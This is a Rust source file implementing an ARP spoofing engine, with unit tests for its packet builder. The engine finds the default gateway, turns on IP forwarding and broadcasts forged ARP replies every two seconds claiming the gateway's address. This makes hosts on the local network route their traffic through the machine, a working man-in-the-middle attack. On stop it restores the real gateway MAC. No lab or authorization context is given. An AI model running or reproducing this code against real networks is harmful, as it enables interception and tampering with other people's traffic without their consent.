use log::{error, info, warn};
use pnet::datalink::{self, Channel};
use pnet::packet::arp::{ArpHardwareTypes, ArpOperations, MutableArpPacket};
use pnet::packet::ethernet::{EtherTypes, MutableEthernetPacket};
use pnet::util::MacAddr;
use std::net::Ipv4Addr;
use std::sync::{
    atomic::{AtomicBool, Ordering},
    Arc,
};
use std::time::Duration;

const ARP_PACKET_SIZE: usize = 28;
const ETHERNET_HEADER_SIZE: usize = 14;
const SPOOF_INTERVAL_SECS: u64 = 2;
const RESTORE_ROUNDS: u32 = 3;

pub struct ArpSpoofEngine {
    interface_name: String,
    running: Arc<AtomicBool>,
}

impl ArpSpoofEngine {
    pub fn new(interface_name: &str) -> Self {
        Self {
            interface_name: interface_name.to_string(),
            running: Arc::new(AtomicBool::new(false)),
        }
    }

    pub fn start(&mut self) {
        if self.running.load(Ordering::SeqCst) {
            warn!("ARP spoof engine already running");
            return;
        }
        self.running.store(true, Ordering::SeqCst);
        let running = self.running.clone();
        let interface_name = self.interface_name.clone();
        std::thread::spawn(move || {
            run_spoof_loop(interface_name, running);
        });
        info!("ARP spoof engine started on {}", self.interface_name);
    }

    pub fn stop(&mut self) {
        if self.running.swap(false, Ordering::SeqCst) {
            info!("ARP spoof engine stopping");
        }
    }

    #[allow(dead_code)]
    pub fn is_running(&self) -> bool {
        self.running.load(Ordering::SeqCst)
    }
}

/// Build an ARP reply Ethernet frame.
///
/// The Ethernet destination is always broadcast (ff:ff:ff:ff:ff:ff).
/// Returns a 42-byte buffer: 14-byte Ethernet header + 28-byte ARP payload.
pub fn build_arp_reply(
    sender_mac: MacAddr,
    sender_ip: Ipv4Addr,
    target_mac: MacAddr,
    target_ip: Ipv4Addr,
) -> Vec<u8> {
    let total_size = ETHERNET_HEADER_SIZE + ARP_PACKET_SIZE;
    let mut buffer = vec![0u8; total_size];

    {
        let mut eth =
            MutableEthernetPacket::new(&mut buffer).expect("buffer large enough for Ethernet");
        eth.set_destination(MacAddr(0xff, 0xff, 0xff, 0xff, 0xff, 0xff));
        eth.set_source(sender_mac);
        eth.set_ethertype(EtherTypes::Arp);
    }
    {
        let mut arp = MutableArpPacket::new(&mut buffer[ETHERNET_HEADER_SIZE..])
            .expect("buffer large enough for ARP");
        arp.set_hardware_type(ArpHardwareTypes::Ethernet);
        arp.set_protocol_type(EtherTypes::Ipv4);
        arp.set_hw_addr_len(6);
        arp.set_proto_addr_len(4);
        arp.set_operation(ArpOperations::Reply);
        arp.set_sender_hw_addr(sender_mac);
        arp.set_sender_proto_addr(sender_ip);
        arp.set_target_hw_addr(target_mac);
        arp.set_target_proto_addr(target_ip);
    }

    buffer
}

fn get_gateway_ip() -> Option<Ipv4Addr> {
    let output = std::process::Command::new("route")
        .args(["-n", "get", "default"])
        .output()
        .ok()?;
    let stdout = String::from_utf8_lossy(&output.stdout);
    for line in stdout.lines() {
        let trimmed = line.trim();
        if trimmed.starts_with("gateway:") {
            return trimmed.split_whitespace().nth(1)?.parse().ok();
        }
    }
    None
}

fn get_gateway_mac(gateway_ip: Ipv4Addr) -> Option<MacAddr> {
    let output = std::process::Command::new("arp")
        .args(["-n", &gateway_ip.to_string()])
        .output()
        .ok()?;
    let stdout = String::from_utf8_lossy(&output.stdout);
    for line in stdout.lines() {
        if line.contains(&gateway_ip.to_string()) {
            for word in line.split_whitespace() {
                // MAC addresses are 17 chars: xx:xx:xx:xx:xx:xx
                if word.len() == 17 && word.chars().filter(|&c| c == ':').count() == 5 {
                    return word.parse().ok();
                }
            }
        }
    }
    None
}

fn enable_ip_forwarding(enabled: bool) {
    let value = if enabled { "1" } else { "0" };
    match std::process::Command::new("sysctl")
        .args(["-w", &format!("net.inet.ip.forwarding={}", value)])
        .status()
    {
        Ok(status) if status.success() => {
            info!("IP forwarding set to {}", value);
        }
        Ok(status) => {
            warn!(
                "sysctl exited with status {} setting ip.forwarding={}",
                status, value
            );
        }
        Err(e) => {
            error!("Failed to run sysctl: {}", e);
        }
    }
}

fn run_spoof_loop(interface_name: String, running: Arc<AtomicBool>) {
    let interfaces = datalink::interfaces();
    let interface = match interfaces.iter().find(|i| i.name == interface_name) {
        Some(i) => i.clone(),
        None => {
            error!("ARP spoof: interface '{}' not found", interface_name);
            running.store(false, Ordering::SeqCst);
            return;
        }
    };

    let our_mac = match interface.mac {
        Some(mac) => mac,
        None => {
            error!(
                "ARP spoof: interface '{}' has no MAC address",
                interface_name
            );
            running.store(false, Ordering::SeqCst);
            return;
        }
    };

    let gateway_ip = match get_gateway_ip() {
        Some(ip) => ip,
        None => {
            error!("ARP spoof: could not determine gateway IP");
            running.store(false, Ordering::SeqCst);
            return;
        }
    };

    // Cache the real gateway MAC before we start spoofing (needed for restore)
    let gateway_mac = get_gateway_mac(gateway_ip);

    // Enable IP forwarding BEFORE sending any ARP replies
    enable_ip_forwarding(true);

    info!(
        "ARP spoof: starting — interface={}, our_mac={}, gateway={}",
        interface_name, our_mac, gateway_ip
    );

    let (mut tx_channel, _rx_channel) = match datalink::channel(&interface, Default::default()) {
        Ok(Channel::Ethernet(tx, rx)) => (tx, rx),
        Ok(_) => {
            error!(
                "ARP spoof: unexpected channel type for interface {}",
                interface_name
            );
            enable_ip_forwarding(false);
            running.store(false, Ordering::SeqCst);
            return;
        }
        Err(e) => {
            error!("ARP spoof: failed to open datalink channel: {}", e);
            enable_ip_forwarding(false);
            running.store(false, Ordering::SeqCst);
            return;
        }
    };

    let broadcast = MacAddr(0xff, 0xff, 0xff, 0xff, 0xff, 0xff);

    while running.load(Ordering::SeqCst) {
        let packet = build_arp_reply(our_mac, gateway_ip, broadcast, Ipv4Addr::UNSPECIFIED);
        match tx_channel.send_to(&packet, None) {
            Some(Ok(())) => {}
            Some(Err(e)) => warn!("ARP spoof: send failed: {}", e),
            None => warn!("ARP spoof: send_to not supported on this channel"),
        }
        std::thread::sleep(Duration::from_secs(SPOOF_INTERVAL_SECS));
    }

    // Restore: send the real gateway MAC so ARP caches recover immediately
    if let Some(real_mac) = gateway_mac {
        info!("ARP spoof: restoring gateway MAC {}", real_mac);
        for _ in 0..RESTORE_ROUNDS {
            let packet = build_arp_reply(real_mac, gateway_ip, broadcast, Ipv4Addr::UNSPECIFIED);
            match tx_channel.send_to(&packet, None) {
                Some(Ok(())) => {}
                Some(Err(e)) => warn!("ARP spoof: restore send failed: {}", e),
                None => {}
            }
            std::thread::sleep(Duration::from_millis(100));
        }
    } else {
        warn!("ARP spoof: could not determine real gateway MAC — ARP caches will expire naturally");
    }

    enable_ip_forwarding(false);
    info!("ARP spoof: stopped");
}

#[cfg(test)]
mod tests {
    use super::*;

    fn test_mac(a: u8, b: u8, c: u8, d: u8, e: u8, f: u8) -> MacAddr {
        MacAddr(a, b, c, d, e, f)
    }

    #[test]
    fn arp_reply_is_42_bytes() {
        let mac = test_mac(0xaa, 0xbb, 0xcc, 0xdd, 0xee, 0xff);
        let ip: Ipv4Addr = "192.168.1.1".parse().unwrap();
        let packet = build_arp_reply(mac, ip, MacAddr(0, 0, 0, 0, 0, 0), Ipv4Addr::UNSPECIFIED);
        assert_eq!(packet.len(), 42);
    }

    #[test]
    fn ethernet_destination_is_broadcast() {
        let mac = test_mac(0xaa, 0xbb, 0xcc, 0xdd, 0xee, 0xff);
        let ip: Ipv4Addr = "192.168.1.1".parse().unwrap();
        let packet = build_arp_reply(mac, ip, MacAddr(0, 0, 0, 0, 0, 0), Ipv4Addr::UNSPECIFIED);
        // Ethernet header bytes 0-5: destination MAC
        assert_eq!(&packet[0..6], &[0xff, 0xff, 0xff, 0xff, 0xff, 0xff]);
    }

    #[test]
    fn ethernet_source_is_sender_mac() {
        let mac = test_mac(0xaa, 0xbb, 0xcc, 0xdd, 0xee, 0xff);
        let ip: Ipv4Addr = "192.168.1.1".parse().unwrap();
        let packet = build_arp_reply(mac, ip, MacAddr(0, 0, 0, 0, 0, 0), Ipv4Addr::UNSPECIFIED);
        // Ethernet header bytes 6-11: source MAC
        assert_eq!(&packet[6..12], &[0xaa, 0xbb, 0xcc, 0xdd, 0xee, 0xff]);
    }

    #[test]
    fn ethernet_ethertype_is_arp() {
        let mac = test_mac(0x11, 0x22, 0x33, 0x44, 0x55, 0x66);
        let ip: Ipv4Addr = "10.0.0.1".parse().unwrap();
        let packet = build_arp_reply(mac, ip, MacAddr(0, 0, 0, 0, 0, 0), Ipv4Addr::UNSPECIFIED);
        // Ethernet header bytes 12-13: EtherType 0x0806 = ARP
        assert_eq!(&packet[12..14], &[0x08, 0x06]);
    }

    #[test]
    fn arp_operation_is_reply() {
        let mac = test_mac(0x11, 0x22, 0x33, 0x44, 0x55, 0x66);
        let ip: Ipv4Addr = "10.0.0.1".parse().unwrap();
        let packet = build_arp_reply(mac, ip, MacAddr(0, 0, 0, 0, 0, 0), Ipv4Addr::UNSPECIFIED);
        // ARP bytes 20-21 (offset 14+6): operation = 0x0002 (reply)
        assert_eq!(&packet[20..22], &[0x00, 0x02]);
    }

    #[test]
    fn arp_sender_mac_position() {
        let mac = test_mac(0xde, 0xad, 0xbe, 0xef, 0x00, 0x01);
        let ip: Ipv4Addr = "192.168.0.1".parse().unwrap();
        let packet = build_arp_reply(mac, ip, MacAddr(0, 0, 0, 0, 0, 0), Ipv4Addr::UNSPECIFIED);
        // ARP sender MAC at bytes 22-27 (offset 14+8)
        assert_eq!(&packet[22..28], &[0xde, 0xad, 0xbe, 0xef, 0x00, 0x01]);
    }

    #[test]
    fn arp_sender_ip_position() {
        let mac = test_mac(0x11, 0x22, 0x33, 0x44, 0x55, 0x66);
        let ip: Ipv4Addr = "192.168.1.254".parse().unwrap();
        let packet = build_arp_reply(mac, ip, MacAddr(0, 0, 0, 0, 0, 0), Ipv4Addr::UNSPECIFIED);
        // ARP sender IP at bytes 28-31 (offset 14+14)
        assert_eq!(&packet[28..32], &[192, 168, 1, 254]);
    }

    #[test]
    fn arp_spoof_engine_not_running_initially() {
        let engine = ArpSpoofEngine::new("en0");
        assert!(!engine.is_running());
    }

    #[test]
    fn arp_spoof_engine_stop_is_idempotent() {
        let mut engine = ArpSpoofEngine::new("en0");
        // Stop without ever starting should not panic
        engine.stop();
        assert!(!engine.is_running());
    }
}
